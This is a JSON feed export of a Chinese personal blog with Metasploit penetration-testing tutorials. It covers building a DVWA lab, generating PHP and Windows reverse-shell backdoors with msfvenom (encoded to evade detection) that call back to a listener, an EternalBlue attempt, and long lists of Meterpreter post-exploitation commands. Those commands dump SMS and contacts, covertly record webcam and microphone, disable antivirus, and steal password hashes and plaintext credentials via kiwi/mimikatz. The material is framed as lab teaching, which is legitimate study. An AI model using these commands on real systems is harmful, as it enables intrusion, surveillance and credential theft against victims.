{
    "version": "https://jsonfeed.org/version/1",
    "title": null,
    "subtitle": "翩若浮云着霓裳，落幕鬓边皆染霜",
    "icon": "https://mangpumo.github.io/images/favicon.ico",
    "description": "欢迎来到 Mang Pumo 的个人博客!",
    "home_page_url": "https://MangPumo.github.io",
    "items": [
        {
            "id": "https://mangpumo.github.io/2023/01/12/PHP%E5%90%8E%E9%97%A8%E5%8F%8D%E5%BC%B9%E6%BC%94%E7%A4%BA/",
            "url": "https://mangpumo.github.io/2023/01/12/PHP%E5%90%8E%E9%97%A8%E5%8F%8D%E5%BC%B9%E6%BC%94%E7%A4%BA/",
            "title": "PHP后门反弹演示",
            "date_published": "2023-01-11T20:48:56.000Z",
            "content_html": "<h1 id=\"一-环境准备\"><a class=\"anchor\" href=\"#一-环境准备\">#</a> 一、 环境准备</h1>\n<h3 id=\"1-dvwa靶场\"><a class=\"anchor\" href=\"#1-dvwa靶场\">#</a> 1 DVWA 靶场</h3>\n<p>DVWA 下载：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlbG9hZC5naXRodWIuY29tL2V0aGljYWxoYWNrM3IvRFZXQS96aXAvbWFzdGVy\">https://codeload.github.com/ethicalhack3r/DVWA/zip/master</span></p>\n<p>注意：配置 DVWA 环境 准备 PHP7.0 以上，和 Nginx 环境<br>\n 1 配置数据库密码  配置 config/config.inc.php.dist 文件（注意后门的 .dist 要通过重命名删掉）<br>\n2 使用浏览器访问 <span class=\"exturl\" data-url=\"aHR0cDovL1h4SVAvc2V0dXAucGhw\">http://XxIP/setup.php</span><br>\n3 红字问题解决<br>\n 4 缺少 key  直接替换下面 2 句  或者 访问 https://www.google.com/recaptcha/admin/create<br>\n<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mrow></mrow><mi>D</mi></msub><mi>V</mi><mi>W</mi><mi>A</mi><msup><mo stretchy=\"false\">[</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mi>r</mi><mi>e</mi><mi>c</mi><mi>a</mi><mi>p</mi><mi>t</mi><mi>c</mi><mi>h</mi><msub><mi>a</mi><mi>p</mi></msub><mi>u</mi><mi>b</mi><mi>l</mi><mi>i</mi><msub><mi>c</mi><mi>k</mi></msub><mi>e</mi><msup><mi>y</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo stretchy=\"false\">]</mo><msup><mo>=</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mn>6</mn><mi>L</mi><mi>d</mi><mi>J</mi><mi>J</mi><mi>l</mi><mi>U</mi><mi>U</mi><mi>A</mi><mi>A</mi><mi>A</mi><mi>A</mi><mi>A</mi><mi>H</mi><mn>1</mn><mi>Q</mi><mn>6</mn><mi>c</mi><mi>T</mi><mi>p</mi><mi>Z</mi><mi>R</mi><mi>Q</mi><mn>2</mn><mi>A</mi><mi>h</mi><mn>8</mn><mi>V</mi><mi>p</mi><mi>y</mi><mi>z</mi><mi>h</mi><mi>n</mi><mi>f</mi><mi>f</mi><mi>D</mi><mn>0</mn><mi>m</mi><mi>B</mi><msup><mi>b</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo separator=\"true\">;</mo></mrow><annotation encoding=\"application/x-tex\">_DVWA[ &#x27;recaptcha_public_key&#x27; ] = &#x27;6LdJJlUUAAAAAH1Q6cTpZRQ2Ah8VpyzhnffD0mBb&#x27;;\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.038em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">D</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">V</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"mord mathnormal\">A</span><span class=\"mopen\"><span class=\"mopen\">[</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">h</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15139200000000003em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">p</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">b</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">i</span><span class=\"mord\"><span class=\"mord mathnormal\">c</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">e</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mclose\">]</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mrel\">=</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.946332em;vertical-align:-0.19444em;\"></span><span class=\"mord\">6</span><span class=\"mord mathnormal\">L</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\" style=\"margin-right:0.09618em;\">J</span><span class=\"mord mathnormal\" style=\"margin-right:0.09618em;\">J</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mord\">1</span><span class=\"mord mathnormal\">Q</span><span class=\"mord\">6</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">Z</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal\">Q</span><span class=\"mord\">2</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\">h</span><span class=\"mord\">8</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">V</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mord mathnormal\" style=\"margin-right:0.04398em;\">z</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord\">0</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\" style=\"margin-right:0.05017em;\">B</span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mpunct\">;</span></span></span></span>_DVWA[ 'recaptcha_private_key' ] = '6LdJJlUUAAAAAM2a3HrgzLczqdYp4g05EqDs-W4K';<br>\n5 allow_url_include: Disabled  提示没开启<br>\n找到 php 目录里的 php.ini allow_url_include  将后面参数 OFF 改成 On 修改完成重启 Nginx 生效</p>\n<h3 id=\"2-metasploit任意平台\"><a class=\"anchor\" href=\"#2-metasploit任意平台\">#</a> 2 Metasploit 任意平台</h3>\n<p>可以是 Windows 版，可以是 kali 自带版</p>\n<h1 id=\"二-metasploit配置监控及攻击载荷\"><a class=\"anchor\" href=\"#二-metasploit配置监控及攻击载荷\">#</a> 二、Metasploit 配置监控及攻击载荷</h1>\n<h3 id=\"1-配置监控-使用handler模块\"><a class=\"anchor\" href=\"#1-配置监控-使用handler模块\">#</a> 1 配置监控 - 使用 handler 模块</h3>\n<h3 id=\"use-exploitmultihandler\"><a class=\"anchor\" href=\"#use-exploitmultihandler\">#</a> use exploit/multi/handler</h3>\n<h3 id=\"img-2-配置攻击载荷设置payload\"><a class=\"anchor\" href=\"#img-2-配置攻击载荷设置payload\">#</a> <img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/a2529fe010ac46108a0413b8153c08b0.png\" alt=\"img\">  2 配置攻击载荷设置 payload</h3>\n<h3 id=\"第一步设置payload\"><a class=\"anchor\" href=\"#第一步设置payload\">#</a> 第一步设置 payload</h3>\n<h3 id=\"set-payload-phpmeterpreterreverse_tcp\"><a class=\"anchor\" href=\"#set-payload-phpmeterpreterreverse_tcp\">#</a> set payload php/meterpreter/reverse_tcp</h3>\n<h3 id=\"第二步设置-lhost-和-lport\"><a class=\"anchor\" href=\"#第二步设置-lhost-和-lport\">#</a> 第二步设置 lhost 和 lport</h3>\n<h3 id=\"set-lhost-xxxip\"><a class=\"anchor\" href=\"#set-lhost-xxxip\">#</a> set lhost xxxip ；</h3>\n<h3 id=\"set-lport-xxx端口\"><a class=\"anchor\" href=\"#set-lport-xxx端口\">#</a> set lport  xxx 端口；</h3>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/ad204b7bb1bc4c709f4d6948d4ef219a.png\" alt=\"img\"></p>\n<h3 id=\"3-生成php后门执行攻击获得meterpreter\"><a class=\"anchor\" href=\"#3-生成php后门执行攻击获得meterpreter\">#</a> 3 生成 php 后门执行攻击获得 meterpreter</h3>\n<p>新建一个终端在终端内输入</p>\n<p>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.3.23 lport=4456 R&gt;shell.php</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/1fa4967afb3f487f84926004d4ddc591.png\" alt=\"img\"></p>\n<p>3.2 传播 - 使用 Python 简单的 web 服务</p>\n<p>python -m SimpleHTTPServer 80</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/6604546c76d7471e9f332e81daf6c570.png\" alt=\"img\"></p>\n<p>将 shell.php</p>\n<p>3.3 执行攻击获得 meterpreter</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/1003035b32a343488a282bddec48a62b.png\" alt=\"img\"></p>\n<p>run 或者 exploit</p>\n<p>获取到 meterpreter 我们就可以做渗透操作了</p>\n<p>比如 观看屏幕 可以在 meterpreter 里输入</p>\n<p>run vnc</p>\n<p>查看当前账号可以在 meterpreter 里输入</p>\n<p>getuid</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/meterpreter/",
            "url": "https://mangpumo.github.io/2023/01/12/meterpreter/",
            "title": "meterpreter",
            "date_published": "2023-01-11T20:46:09.000Z",
            "content_html": "<h1 id=\"一-meterpreter是什么\"><a class=\"anchor\" href=\"#一-meterpreter是什么\">#</a> 一、 Meterpreter 是什么</h1>\n<p>Meterpreter 是 Metasploit 框架中的一个利器，作为漏洞溢出后的攻击载荷使用，攻击载荷在触发漏洞后会返回一个由我们控制的通道，可用于远程执行命令！<br>\nMetasploit 提供了各个主流平台的 Meterpreter 版本，包括 Windows、Linux，同时支持 x86、x64 平台，另外，Meterpreter 还提供了基于 PHP 和 Java 语言的实现。Meterpreter 的工作模式是纯内存的，好处是启动隐藏，很难被杀毒软件监测到。不需要访问目标主机磁盘，所以也没什么入侵的痕迹。除上述外，Meterpreter 还支持 Ruby 脚本形式的扩展。所以 Ruby 语言还很有必要了解下。</p>\n<h1 id=\"二-meterpreter中常用的反弹类型\"><a class=\"anchor\" href=\"#二-meterpreter中常用的反弹类型\">#</a> 二、Meterpreter 中常用的反弹类型</h1>\n<p>1.reverse_tcp<br>\n 这是一个基于 TCP 的反向链接反弹 shell, 使用起来很稳定</p>\n<h1 id=\"三-meterpreter的常用命令\"><a class=\"anchor\" href=\"#三-meterpreter的常用命令\">#</a> 三、Meterpreter 的常用命令</h1>\n<h2 id=\"1基本命令\"><a class=\"anchor\" href=\"#1基本命令\">#</a> 1. 基本命令</h2>\n<p>help# 查看 Meterpreter 帮助</p>\n<p>background# 返回，把 meterpreter 后台挂起<br>\n bgkill# 杀死一个 meterpreter 脚本<br>\n bglist# 提供所有正在运行的后台脚本的列表<br>\n bgrun# 作为一个后台线程运行脚本<br>\n channel# 显示活动频道<br>\n sessions -i number # 与会话进行交互，number 表示第 n 个 session, 使用 session -i 连接到指定序号的 meterpreter 会话已继续利用<br>\n sesssions -k  number #与会话进行交互<br>\n close# 关闭通道<br>\n exit# 终止 meterpreter 会话<br>\n quit# 终止 meterpreter 会话<br>\n interact id #切换进一个信道<br>\n run# 执行一个已有的模块，这里要说的是输入 run 后按两下 tab，会列出所有的已有的脚本，常用的有 autoroute,hashdump,arp_scanner,multi_meter_inject 等<br>\n irb# 进入 Ruby 脚本模式<br>\n read# 从通道读取数据 write# 将数据写入到一个通道<br>\n run 和 bgrun# 前台和后台执行以后它选定的 meterpreter 脚本<br>\n use# 加载 meterpreter 的扩展<br>\n load/use# 加载模块<br>\n Resource# 执行一个已有的 rc 脚本</p>\n<h2 id=\"2-常用命令\"><a class=\"anchor\" href=\"#2-常用命令\">#</a> 2  常用命令</h2>\n<h3 id=\"21-针对安卓手机的一些命令\"><a class=\"anchor\" href=\"#21-针对安卓手机的一些命令\">#</a> 2.1 针对安卓手机的一些命令</h3>\n<p>获取手机通讯录： dump_contacts</p>\n<p>获取短信记录：dump_sms</p>\n<p>控制实验手机发短信：send_sms -d 15330252525 -t<br>\n&quot;hello&quot;</p>\n<p>获取实验手机 GPS 定位信息：geolocate</p>\n<p>获取实验手机 Wi-Fi 定位信息：wlan_geolocate</p>\n<p>控制实验手机录音：record_mic<br>\n-d  5</p>\n<p>获取实验手机相机设备：webcam_list</p>\n<p>控制实验手机拍照 ：webcam_snap</p>\n<p>直播实验手机摄像头：webcam_stream</p>\n<h3 id=\"22-针对windows的一些命令\"><a class=\"anchor\" href=\"#22-针对windows的一些命令\">#</a> 2.2 针对 Windows 的一些命令</h3>\n<p>查看进程：ps</p>\n<p>查看当前进程号：getpid</p>\n<p>查看系统信息：sysinfo</p>\n<p>查看目标机是否为虚拟机：run<br>\npost/windows/gather/checkvm</p>\n<p>查看完整网络设置：route</p>\n<p>查看当前权限：getuid</p>\n<p>自动提权：getsystem</p>\n<p>关闭杀毒软件：run post/windows/manage/killav</p>\n<p>启动远程桌面协议：run post/windows/manage/enable_rdp</p>\n<p>列举当前登录的用户：run post/windows/gather/enum_logged_on_users</p>\n<p>查看当前应用程序：run post/windows/gather/enum_applications</p>\n<p>抓取目标机的屏幕截图：load espia ； screengrab</p>\n<p>获取相机设备：webcam_list</p>\n<p>控制拍照 ：webcam_snap</p>\n<p>直播摄像头：webcam_stream</p>\n<p>控制录音：record_mic</p>\n<p>查看当前处于目标机的那个目录：pwd</p>\n<p>查看当前目录：getlwd</p>\n<p>导出当前用户密码哈希  run hashdump</p>\n<p>用户名：SID：LM 哈希：NTLM 哈希:::</p>\n<p>也可以使用下面这个命令导出 权限更高   run windows/gather/smart_hashdump</p>\n<p>抓取自动登录的用户名和密码  run windows/gather/credentials/windows_autologin</p>\n<p>直接获取明文密码（注意这个功能需要获取系统权限  获取系统权限需要输入 getsystem）</p>\n<p>首选终端输入  load kiwi    加载 kiwi</p>\n<p>creds_all：列举所有凭据<br>\n creds_kerberos：列举所有 kerberos 凭据<br>\n creds_msv：列举所有 msv 凭据<br>\n creds_ssp：列举所有 ssp 凭据<br>\n creds_tspkg：列举所有 tspkg 凭据<br>\n creds_wdigest：列举所有 wdigest 凭据<br>\n dcsync：通过 DCSync 检索用户帐户信息<br>\n dcsync_ntlm：通过 DCSync 检索用户帐户 NTLM 散列、SID 和 RID<br>\ngolden_ticket_create：创建黄金票据<br>\n kerberos_ticket_list：列举 kerberos 票据<br>\n kerberos_ticket_purge：清除 kerberos 票据<br>\n kerberos_ticket_use：使用 kerberos 票据<br>\n kiwi_cmd：执行 mimikatz 的命令，后面接 mimikatz.exe 的命令<br>\n lsa_dump_sam：dump 出 lsa 的 SAM<br>\nlsa_dump_secrets：dump 出 lsa 的密文<br>\n password_change：修改密码<br>\n wifi_list：列出当前用户的 wifi 配置文件<br>\n wifi_list_shared：列出共享 wifi 配置文件 / 编码</p>\n<h2 id=\"3文件系统命令\"><a class=\"anchor\" href=\"#3文件系统命令\">#</a> 3. 文件系统命令</h2>\n<p>cat c:\\boot.ini# 查看文件内容，文件必须存在<br>\n del c:\\boot.ini #删除指定的文件<br>\n upload /root/Desktop/netcat.exe c:\\ # 上传文件到目标机主上，如 upload  setup.exe C:\\windows\\system32<br>\ndownload nimeia.txt/root/Desktop/   # 下载文件到本机上如：download C:\\boot.ini/root / 或者 download C:\\&quot;ProgramFiles&quot;\\Tencent\\QQ\\Users\\295****<em><em>125\\Msg2.0.db /root/<br>\nedit c:\\boot.ini  # 编辑文件<br>\n getlwd# 打印本地目录<br>\n getwd# 打印工作目录<br>\n lcd# 更改本地目录<br>\n ls# 列出在当前目录中的文件列表<br>\n lpwd# 打印本地目录<br>\n pwd# 输出工作目录<br>\n cd c:\\ #进入目录文件下<br>\n rm file #删除文件<br>\n mkdir dier #在受害者系统上的创建目录<br>\n rmdir# 受害者系统上删除目录<br>\n dir# 列出目标主机的文件和文件夹信息<br>\n mv# 修改目标主机上的文件名<br>\n search -d d:\\www -f web.config #search 文件，如 search  -d c:\\  -f</em>.doc<br>\nmeterpreter &gt; search -f autoexec.bat  #搜索文件<br>\n meterpreter &gt; search -f sea</em>.bat c:\\xamp\\<br>\nenumdesktops     #用户登录数</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/msfconsole%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B/",
            "url": "https://mangpumo.github.io/2023/01/12/msfconsole%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B/",
            "title": "msfconsole漏洞利用流程",
            "date_published": "2023-01-11T19:46:27.000Z",
            "content_html": "<h1 id=\"一-阶段划分\"><a class=\"anchor\" href=\"#一-阶段划分\">#</a> 一、阶段划分：</h1>\n<p>漏洞利用分为 前期交互   情报搜集 威胁建模  漏洞分析。渗透利用  后渗透利用 报告 这几个阶段</p>\n<h2 id=\"1前期交互阶段\"><a class=\"anchor\" href=\"#1前期交互阶段\">#</a> 1. 前期交互阶段：</h2>\n<p>与客户组织进行交互讨论，确定范围，目标等</p>\n<p>​         这个阶段大家可以理解为情报收集前阶段，主要是为了找到目标 确认范围</p>\n<p>![1643165117094](10-11  msfconsole 漏洞利用流程.assets/1643165117094.png)</p>\n<h2 id=\"2情报搜集阶段\"><a class=\"anchor\" href=\"#2情报搜集阶段\">#</a> 2. 情报搜集阶段：</h2>\n<p>获取更多目标组织信息，</p>\n<p>|          外围信息搜索   -    Google</p>\n<p>![1643165139006](10-11  msfconsole 漏洞利用流程.assets/1643165139006.png)</p>\n<p>​          主机探测与端口扫描         如 -Nmap</p>\n<p>​           服务扫描       利用 metasploit 中的 auxiliary/scanner/ 中的服务扫描模块，可以对靶机中的服务版本等信息进行扫描</p>\n<p>​            网络漏洞扫描   -OpenVAS、Nessus 等</p>\n<p>​             其他工具扫描  py 脚本扫描</p>\n<h2 id=\"3威胁建模阶段\"><a class=\"anchor\" href=\"#3威胁建模阶段\">#</a> 3. 威胁建模阶段：</h2>\n<p>理清头绪，确定出最可行的漏洞利用通道，这个建模阶段写的文档不是给自己看的 是给整个团队看的 方便多人合作</p>\n<p>![1643165166875](10-11  msfconsole 漏洞利用流程.assets/1643165166875.png)</p>\n<p>​           这个阶段主要是根据收集到的情报进行整理 ，理清漏洞利用思路。</p>\n<h2 id=\"4漏洞分析阶段\"><a class=\"anchor\" href=\"#4漏洞分析阶段\">#</a> 4. 漏洞分析阶段：</h2>\n<p>搜索可获取的渗透代码资源</p>\n<p>![1643165182827](10-11  msfconsole 漏洞利用流程.assets/1643165182827.png)</p>\n<p>​           这个阶段主要 挑选匹配可能存在的漏洞利用模块，shellcode</p>\n<h2 id=\"5渗透利用阶段\"><a class=\"anchor\" href=\"#5渗透利用阶段\">#</a> 5. 渗透利用阶段：</h2>\n<p>找出安全漏洞，入侵系统</p>\n<p>​          这个阶段尝试利用漏洞 ，配置监控，开始漏洞利用</p>\n<h2 id=\"6后渗透利用阶段\"><a class=\"anchor\" href=\"#6后渗透利用阶段\">#</a> 6. 后渗透利用阶段：</h2>\n<p>Meterpreter，实施操作</p>\n<p>​            这个阶段 就开始实施相关数据下载 后门维持  提权等操作</p>\n<h2 id=\"7报告阶段\"><a class=\"anchor\" href=\"#7报告阶段\">#</a> 7. 报告阶段：</h2>\n<p>漏洞利用渗透测试报告  （详细报告编写看 渗透测试报告课程）</p>\n<p>![1643165204135](10-11  msfconsole 漏洞利用流程.assets/1643165204135.png)</p>\n<p>|             这个阶段主要是对本次渗透进行总结，概述总体上包括 时间、人员、漏洞利用范围、技术手段等等。我们需要在这部分确定漏洞利用执行的时间范围、参与漏洞利用的人员及联系方式、约定的漏洞利用范围和一些漏洞利用过程中采用的技术、工具描述。写清  前期交互   情报搜集 威胁建模  漏洞分析。渗透利用  后渗透利用  漏洞利用结果 安全建议 等内容</p>\n<p>在撰写的过程中，需要特别注意的是：漏洞描述切忌不可过于简单，一笔带过；在安全建议部分避免提出没有实际意义的安全建议，比如加强安全意识；报告结构混乱不堪，太多复杂的专业术语，比如绕狗、x 站等等；</p>\n<h1 id=\"二-实际操作举例\"><a class=\"anchor\" href=\"#二-实际操作举例\">#</a> 二、实际操作（举例）</h1>\n<p>主机范围和目标已确定</p>\n<p>1 情报搜集</p>\n<p>基于 msf 发现内网存活主机</p>\n<p>search 搜索</p>\n<p>msf 终端内输入 search scanner type:auxiliary</p>\n<p>可用于发现主机的模块</p>\n<p>auxiliary/scanner/discovery/arp_sweep # 基于 ARP 发现内网存活主机</p>\n<p>auxiliary/scanner/discovery/udp_sweep # 基于 UDP 发现内网存活主机</p>\n<p>auxiliary/scanner/ftp/ftp_version # 发现 FTP 服务</p>\n<p>auxiliary/scanner/http/http_version # 发现 HTTP 服务</p>\n<p>auxiliary/scanner/smb/smb_version # 基于 smb 发现内网存活主机</p>\n<p>基于 netbios 发现内网存活主机</p>\n<p>基于 snmap 发现内网存活主机</p>\n<p>基于 ICMP 发现内网存活主机</p>\n<p>2  威胁建模</p>\n<hr>\n<p>经过第一步情报收集 我们通过 arp 发现了 目标机器 ip</p>\n<p>然后通过对目标机器的 ip 扫描  我们知道了  目标机器开通了 80 端口  有 web 服务  开了 ftp 端口  有文件服务</p>\n<p>开了 smb</p>\n<p>最终决定对 smb 相关的漏洞进行利用</p>\n<p>备选方案通过植入木马的方式进行利用</p>\n<hr>\n<p>3   漏洞分析</p>\n<p>第一步先查看 smb 利用漏洞有哪些  比如永恒之蓝</p>\n<p>1 查询 msf 与永恒之蓝相关的 模块</p>\n<p>使用命令    search ms17_010</p>\n<p>2 然后我们利用了一个永恒之蓝的 扫描模块</p>\n<p>use auxiliary/scanner/smb/smb_ms17_010</p>\n<p>3  输入  options  查看扫描模块需要配置的参数</p>\n<p>3.1 然后我们配置了 rhost  （rhost 指的是目标主机 ip）</p>\n<p>set rhost   ip</p>\n<p>4 然后我们执行扫描 输入  run</p>\n<p>发现了 可能存在漏洞的主机</p>\n<p>4  渗透利用</p>\n<hr>\n<p>1 加载 永恒之蓝漏洞利用模块</p>\n<p>use exploit/windows/smb/ms17_010_eternalblue</p>\n<p>2  输入  options  查看扫描模块需要配置的参数</p>\n<p>3.1 然后我们配置了 rhost  （rhost 指的是目标主机 ip）</p>\n<p>set rhost   ip</p>\n<p>3.2 然后我们配置了  lhost （lhost 指的是  监控主机或攻击机 ip）</p>\n<p>set lhost   ip</p>\n<p>3.3 然后我们配置了 lport  （指的是监控的端口 ）</p>\n<p>set lport   ip</p>\n<p>注意端口必须没有被占用</p>\n<p>4 然后我们执行扫描 输入  run 执行永恒之蓝漏洞利用</p>\n<p>但是发现失败  提示 模块已经利用了  但是没有返回对应 session</p>\n<p>![image.png](10-11  msfconsole 漏洞利用流程.assets/bffdb79061ad4b0aa92d2dfde83e9f1b.png)</p>\n<p>5  备选方案通过植入木马的方式进行利用</p>\n<hr>\n<p>1  我们知道目标机器是 win 系统  所以使用 msfvenom  生成一个 win 平台的木马</p>\n<p>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp</p>\n<p>LHOST=192.168.3.33 LPORT=4446 -e x86/shikata_ga_nai -b '\\x00\\x0a\\xff' -i 10  -f exe -o payload.exe</p>\n<p>2 漏洞生成后  通过启动一个 py 服务将木马上传到目标机器</p>\n<p>python -m SimpleHTTPServer 80</p>\n<p>3 配置监控程序我们使用了</p>\n<p>use exploit/multi/handler</p>\n<p>3 输入 options 进入配置</p>\n<p>3.1 然后我们配置了  lhost （lhost 指的是  监控主机或攻击机 ip）</p>\n<p>set lhost   ip</p>\n<p>3.2 然后我们配置了 lport  （指的是监控的端口 ）</p>\n<p>set lport   ip</p>\n<p>注意端口必须和 msfvenom 生成的木马端口一样才行</p>\n<p>4 配置攻击载荷 payload</p>\n<p>set payload windows/meterpreter/reverse_tcp</p>\n<p>5 执行利用等待目标机器执行木马</p>\n<p>6 目标机器执行了木马</p>\n<p>利用成功并获得 meterpreter</p>\n<hr>\n<p>5  后渗透利用</p>\n<p>进入新文档</p>\n<p>6  报告阶段</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/msfvenom%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0/",
            "url": "https://mangpumo.github.io/2023/01/12/msfvenom%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0/",
            "title": "",
            "date_published": "2023-01-11T19:37:56.265Z",
